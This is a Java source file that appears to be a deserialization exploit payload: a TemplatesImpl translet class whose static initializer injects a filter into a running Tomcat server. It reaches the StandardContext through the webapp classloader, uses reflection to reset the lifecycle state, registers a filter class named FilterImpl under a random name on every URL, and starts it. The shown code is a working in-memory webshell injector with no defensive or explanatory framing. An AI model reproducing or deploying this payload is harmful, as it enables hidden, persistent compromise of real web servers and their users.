package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.UUID;

public class TemplatesImplPayload3 extends AbstractTranslet {

    static {
        try {
            WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
            ServletContext servletContext = standardContext.getServletContext();

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            try {
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                servletContext
                        .addFilter(UUID.randomUUID().toString(), (Class<Filter>) classLoader.loadClass("com.xhstormr.app.FilterImpl"))
                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");

                stateField.set(standardContext, LifecycleState.STARTED);

                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
